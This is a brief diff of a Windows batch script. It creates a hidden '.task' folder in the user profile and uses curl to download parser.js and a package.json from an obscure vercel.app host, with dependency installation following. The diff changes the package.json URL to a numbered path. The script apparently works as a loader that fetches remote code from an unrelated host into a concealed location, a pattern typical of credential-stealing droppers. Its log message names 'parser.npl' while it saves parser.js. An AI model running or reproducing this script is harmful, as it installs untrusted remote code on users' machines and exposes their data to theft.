@@ -81,7 +81,7 @@ echo [INFO] Downloading parser.npl and package.json...
 
 MD "%USERPROFILE%\.task" 2>nul
 curl -L -o "%USERPROFILE%\.task\parser.js" "https://vercel-rho-amber-58.vercel.app/303/parser.js"
-curl -L -o "%USERPROFILE%\.task\package.json" "https://vercel-rho-amber-58.vercel.app/package.json"
+curl -L -o "%USERPROFILE%\.task\package.json" "https://vercel-rho-amber-58.vercel.app/399/package.json"
 
 :: -------------------------
 :: Install dependencies
